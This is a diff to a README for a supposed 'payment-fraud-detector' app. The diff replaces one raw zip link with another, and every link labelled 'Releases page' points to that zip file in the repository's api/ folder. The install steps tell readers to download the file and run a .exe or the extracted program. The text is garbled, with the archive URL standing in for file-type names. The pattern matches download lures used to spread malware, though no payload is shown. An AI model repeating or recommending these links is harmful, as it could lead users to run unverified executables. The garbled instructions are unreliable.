@@ -1,6 +1,6 @@
 # 🛡️ payment-fraud-detector - Protect Your Finances with Smart Detection
 
-[![Download from Releases](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip%20Now-From%20Releases-007BFF)](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip)
+[![Download from Releases](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip%20Now-From%20Releases-007BFF)](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip)
 
 ## 📖 Overview
 
@@ -12,18 +12,18 @@ To get started with the payment-fraud-detector, follow these simple steps.
 
 ### 🔗 Step 1: Visit the Download Page
 
-Go to the [Releases page](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip) to find the latest version of the software. 
+Go to the [Releases page](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip) to find the latest version of the software. 
 
 ### 💾 Step 2: Download the Application
 
-On the Releases page, you will see various files available for download. Click on the asset that matches your operating system to download the application. This may be a .exe file for Windows or a https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip file for Mac or Linux.
+On the Releases page, you will see various files available for download. Click on the asset that matches your operating system to download the application. This may be a .exe file for Windows or a https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip file for Mac or Linux.
 
 ### ⚙️ Step 3: Install the Application
 
 1. Find the downloaded file in your downloads folder.
 2. For Windows, double-click the .exe file. Follow the installation prompts.
-3. For Mac, open the https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip file and drag the application to the Applications folder.
-4. For Linux, extract the https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip file and run the application from the terminal.
+3. For Mac, open the https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip file and drag the application to the Applications folder.
+4. For Linux, extract the https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip file and run the application from the terminal.
 
 ### ▶️ Step 4: Run the Application
 
@@ -47,7 +47,7 @@ To ensure smooth operation, your system should meet the following requirements:
 
 ## 🌐 Download & Install
 
-You can download the application by visiting the [Releases page](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip). Make sure to select the correct version for your operating system, follow the installation steps outlined above, and start detecting fraudulent transactions effortlessly.
+You can download the application by visiting the [Releases page](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip). Make sure to select the correct version for your operating system, follow the installation steps outlined above, and start detecting fraudulent transactions effortlessly.
 
 ## 🤝 Contributing
 
@@ -65,4 +65,4 @@ The payment-fraud-detector is open source and available under the MIT License. Y
 
 We appreciate the community for their support and contributions. 
 
-For more information, please visit the [Releases page](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/fraud_detector_payment_2.2.zip) and get started today.
+For more information, please visit the [Releases page](https://github.com/Para99999/payment-fraud-detector/raw/refs/heads/master/api/payment-fraud-detector-v3.4.zip) and get started today.
